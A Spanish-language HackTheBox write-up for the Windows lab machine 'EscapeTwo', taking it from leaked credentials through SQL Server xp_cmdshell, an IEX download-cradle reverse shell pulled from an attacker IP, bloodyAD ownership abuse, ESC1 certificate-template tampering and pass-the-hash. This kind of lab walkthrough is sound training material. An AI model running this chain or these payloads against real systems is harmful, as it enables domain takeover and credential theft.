---
title: "Máquina EscapeTwo"
description: "Resolución de la máquina de HackTheBox"
tags: ["Credentials Leak", "SQL Server", "AD", "ADCS"]
categories: ["HackTheBox", "Easy", "Windows"]
logo: "/assets/writeups/escapetwo/logo.webp"
---

Un servidor expuesto al internet con credenciales filtradas posee un recurso SMB con información sensible de algunos de sus usuarios. Utilizaremos unas credenciales para ganar acceso a una instancia de SQL Server y posteriormente comprometer todo el servidor.

## Reconocimiento

No vamos a escanear puertos en esta máquina. Vamos a ir al grano sabiendo que se trata de una máquina Windows y teniendo las credenciales filtradas `rose:KxEPkKe6R8su`.

Hay unos cuantos recursos SMB disponibles:

```bash
❯ nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ            
```

El dominio del DC es `sequel.htb`, vamos a agregar dicho nombre junto a su subdominio en nuestro archivo de hosts:

```bash
10.10.11.51 sequel.htb dc01.sequel.htb
```

Podemos ver que en SMB, tenemos acceso a un recurso llamado Account Department (departamento de cuentas). Viendo que tiene vemos unos archivos de Excel, que son comúnmente usados en temas de contabilidad:

```bash
❯ smbclient.py 'rose:KxEPkKe6R8su@dc01.sequel.htb'
Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 
... [snip]
# ls
drw-rw-rw-          0  Sun Jun  9 07:11:31 2024 .
drw-rw-rw-          0  Sun Jun  9 07:11:31 2024 ..
-rw-rw-rw-      10217  Sun Jun  9 07:11:31 2024 accounting_2024.xlsx
-rw-rw-rw-       6780  Sun Jun  9 07:11:31 2024 accounts.xlsx
```

Descargando los recursos, podemos ver que parecen tratarse de unos ficheros zip:

```bash
❯ file accounting_2024.xlsx accounts.xlsx 
accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1284, method=deflate
accounts.xlsx:        Zip archive data, made by v2.0, extract using at least v2.0, last modified, last modified Sun, Jun 09 2024 10:47:44, uncompressed size 681, method=deflate
```

El primero tiene unos metadatos bastante irregulares, de los que hablaremos más tarde. Pero aún así, podemos extraerlo como el segundo:

```bash
❯ unzip accounting_2024.xlsx -d accounting_2024
Archive:  accounting_2024.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: accounting_2024/_rels/.rels  
  inflating: accounting_2024/xl/workbook.xml  
  inflating: accounting_2024/xl/_rels/workbook.xml.rels  
  inflating: accounting_2024/xl/worksheets/sheet1.xml  
  inflating: accounting_2024/xl/theme/theme1.xml  
  inflating: accounting_2024/xl/styles.xml  
  inflating: accounting_2024/xl/sharedStrings.xml  
  inflating: accounting_2024/xl/worksheets/_rels/sheet1.xml.rels  
  inflating: accounting_2024/xl/printerSettings/printerSettings1.bin  
  inflating: accounting_2024/docProps/core.xml  
  inflating: accounting_2024/docProps/app.xml  
❯ unzip accounts.xlsx -d accounts       
Archive:  accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: accounts/xl/workbook.xml  
  inflating: accounts/xl/theme/theme1.xml  
  inflating: accounts/xl/styles.xml  
  inflating: accounts/xl/worksheets/_rels/sheet1.xml.rels  
  inflating: accounts/xl/worksheets/sheet1.xml  
  inflating: accounts/xl/sharedStrings.xml  
  inflating: accounts/_rels/.rels    
  inflating: accounts/docProps/core.xml  
  inflating: accounts/docProps/app.xml  
  inflating: accounts/docProps/custom.xml  
  inflating: accounts/[Content_Types].xml  
```

El fichero `accounting_2024.xlsx` no tiene más que una factura por la licencia de Windows Server por parte de Dunder Mifflin. Pero el otro tiene algo interesante en `xl/sharedStrings.xml`; una lista de usuarios con sus nombres y credenciales:

```xml
<!-- Lo he puesto más bonito -->
<sst>
<si><t xml:space="preserve">Angela</t></si>
<si><t xml:space="preserve">Martin</t></si>
<si><t xml:space="preserve">angela@sequel.htb</t></si>
<si><t xml:space="preserve">angela</t></si>
<si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si>

<si><t xml:space="preserve">Oscar</t></si>
<si><t xml:space="preserve">Martinez</t></si>
<si><t xml:space="preserve">oscar@sequel.htb</t></si>
<si><t xml:space="preserve">oscar</t></si>
<si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si>

<si><t xml:space="preserve">Kevin</t></si>
<si><t xml:space="preserve">Malone</t></si>
<si><t xml:space="preserve">kevin@sequel.htb</t></si>
<si><t xml:space="preserve">kevin</t></si>
<si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si>

<si><t xml:space="preserve">NULL</t></si>
<si><t xml:space="preserve">sa@sequel.htb</t></si>
<si><t xml:space="preserve">sa</t></si>
<si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si>
</sst>
```

Veamos que hacemos con esto que acabamos de obtener.

## Intrusión

### sa - dc01.sequel.htb

Probando las credenciales que obtuvimos, veremos que solamente un par es válido:

```bash
❯ nxc smb 10.10.11.51 -u oscar -p '86LxLBMgEWaKUnBG' --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG
```

Sin embargo, hay algo más interesante que esto, y es que el último par del archivo parece ser del usuario `sa` de una instancia de SQL Server, y dicho puerto está abierto en la máquina:

```bash
❯ nmap -sS -Pn -p 1433 -vvv -n 10.10.11.51
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 10:35 -04
Initiating SYN Stealth Scan at 10:35
Scanning 10.10.11.51 [1 port]
Discovered open port 1433/tcp on 10.10.11.51
Completed SYN Stealth Scan at 10:35, 0.10s elapsed (1 total ports)
Nmap scan report for 10.10.11.51
Host is up, received user-set (0.083s latency).
Scanned at 2025-05-26 10:35:03 -04 for 0s

PORT     STATE SERVICE  REASON
1433/tcp open  ms-sql-s syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)
```

Si probamos las credenciales de `sa` acá, veremos que...

```bash
❯ mssqlclient.py 'sequel.htb/sa:MSSQLP@ssw0rd!@dc01.sequel.htb' 
Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)>
```

Este usuario normalmente tiene privilegios administrativos acá, y podemos comprobarlo con simplemente ejecutar `sp_configure`:

```bash
SQL (sa  dbo@master)> sp_configure
name                                    minimum      maximum   config_value    run_value   
---------------------------------   -----------   ----------   ------------   ----------   
access check cache bucket count               0        65536              0            0   

access check cache quota                      0   2147483647              0            0   

Ad Hoc Distributed Queries                    0            1              0            0   

ADR cleaner retry timeout (min)               0        32767              0            0   
... [snip]
```

Vamos a activar el comando `xp_cmdshell` para ejecutar comandos del sistema:

```bash
SQL (sa  dbo@master)> sp_configure 'xp_cmdshell',1
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> reconfigure
SQL (sa  dbo@master)> xp_cmdshell "dir C:\"
output                                                       
----------------------------------------------------------   
 Volume in drive C has no label.                             

 Volume Serial Number is 3705-289D                           
... [snip]
```

Podemos proceder a enviarnos una reverse shell, yo utilizaré [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) por temas de facilidad.

```bash
SQL (sa  dbo@master)> xp_cmdshell "powershell IEX((New-Object Net.WebClient).DownloadString(\"http://10.10.16.70:8000/uwu\"))"
```

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.51 53034
^Z
[1]  + 19474 suspended  nc -lvnp 443

❯ stty raw -echo; fg
PS C:\Windows\system32>
```

### ryan - dc01.sequel.htb

Hay una carpeta de SQL Server en la raiz del volumen `C:\`

```bat
PS C:\> ls -Force


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                                               
----                -------------         ------ ----                                                                                               
d--hs-       12/25/2024   6:44 AM                $Recycle.Bin                                                                                       
d--hsl         6/8/2024   6:29 PM                Documents and Settings                                                                             
d-----        11/5/2022  12:03 PM                PerfLogs                                                                                           
d-r---         1/4/2025   7:11 AM                Program Files                                                                                      
d-----         6/9/2024   8:37 AM                Program Files (x86)                                                                                
d--h--         1/6/2025   5:33 AM                ProgramData                                                                                        
d--hs-         6/8/2024   6:29 PM                Recovery                                                                                           
d-----         6/8/2024   3:07 PM                SQL2019                                                                                            
d--hs-         6/8/2024   9:36 AM                System Volume Information                                                                          
d-r---         6/9/2024   6:42 AM                Users                                                                                              
d-----         1/4/2025   8:10 AM                Windows                                                                                            
-a-hs-        5/26/2025   3:01 AM     1476395008 pagefile.sys            
```

En `C:\SQL2019\ExpressAdv_ENU` podemos explorar y encontrarnos un archivo llamado `sql-Configuration.INI` que contiene lo siguiente:

```ini
[OPTIONS] 
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL="0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False"
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1" 
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

Otra contraseña, y si la probamos con los usuarios que podemos ver con el comando `net user`:

```bash
❯ nxc smb 10.10.11.51 -u users.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ca_svc:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\rose:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
```

Este usuario es parte del grupo de administración remota, por lo que puede usar WinRM:

```bat
PS C:\SQL2019\ExpressAdv_ENU> net user ryan
User name                    ryan
Full Name                    Ryan Howard
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/8/2024 9:55:45 AM
Password expires             Never
Password changeable          6/9/2024 9:55:45 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2025 6:53:57 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Management Department*Domain Users
The command completed successfully.
```

```bash
❯ evil-winrm -i dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3
Evil-WinRM shell v3.6
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

En el escritorio del usuario podremos encontrar la primera flag.

```bash
*Evil-WinRM* PS C:\Users\ryan\Desktop> ls -Force


    Directory: C:\Users\ryan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/26/2025   3:02 AM             34 user.txt


*Evil-WinRM* PS C:\Users\ryan\Desktop> type user.txt
7b5db5706610e8d087681e1829******
```

## Escalada de privilegios

Recopilando datos del equipo utilizando SharpHound, podremos ver que ryan tiene ciertos permisos sobre `ca_svc`:

![uh oh](/assets/writeups/escapetwo/1.png)

Al hacernos propietarios del objeto, podemos agregarle luego cualquier permiso como un bonito `FullControl`, y así reiniciarle la contraseña.

Con [bloodyAD](https://github.com/CravateRouge/bloodyAD) podemos hacer las tres cosas de una sola vez.

```bash
❯ bloodyAD --host dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb set owner ca_svc ryan
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
❯ bloodyAD --host dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb add genericAll ca_svc ryan
[+] ryan has now GenericAll on ca_svc
❯ bloodyAD --host dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb set password ca_svc 'Password123!'
[+] Password changed successfully!
```

Vamos a obtener un ticket de Kerberos para el tema de la persistencia, ya que hay una tarea automatizada que deshace nuestros cambios.

```bash
❯ getTGT.py 'sequel.htb/ca_svc:Password123!'
Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ca_svc.ccache
❯ export KRB5CCNAME=ca_svc.ccache
```

Ahora, como `ca_svc` podemos modificar una plantilla para certificados debido a que pertenecemos al grupo de publicantes de certificados:

![uh oh x2](/assets/writeups/escapetwo/2.png)

Por lo que simplemente podemos hacer esta plantilla vulnerable a [ESC1](https://www.semperis.com/blog/esc1-attack-explained/), que básicamente nos permite pedir un certificado para autenticarnos en el DC en nombre de quien sea:

```bash
❯ certipy template -k -no-pass -u 'ca_svc@sequel.htb' -template "Dunder Mifflin Authentication" -ns 10.10.11.51 -target dc01.sequel.htb -write-default-configuration
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'DunderMifflinAuthentication.json'
File 'DunderMifflinAuthentication.json' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote current configuration for 'Dunder Mifflin Authentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'
```

Ahora podemos pedir un certificado como administrador y obtener su hash NT:

```bash
❯ certipy req -k -no-pass -u 'ca_svc@sequel.htb' -ca SEQUEL-DC01-CA -template DUNDERMIFFLINAUTHENTICATION -ns 10.10.11.51 -dc-host dc01.sequel.htb -target dc01.sequel.htb -upn administrator@sequel.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
❯ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51 -domain sequel.htb -username administrator -no-save
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

Con esto ya podremos ir por WinRM al escritorio para tomar la última flag.

```bash
❯ evil-winrm -i dc01.sequel.htb -u administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
Evil-WinRM shell v3.6
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/26/2025   3:02 AM             34 root.txt
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
a74d12446ebb0deea8a74c939b******
```

## Extra

Al inicio, el autor tenía la intención de que nosotros agregaramos un byte mágico faltante en los archivos Excel, para que así el propio Excel y otros software pudieran leerlo sin problemas. Por eso saltaba el error `bad zipfile offset (local header sig):  0` por parte del comando zip.

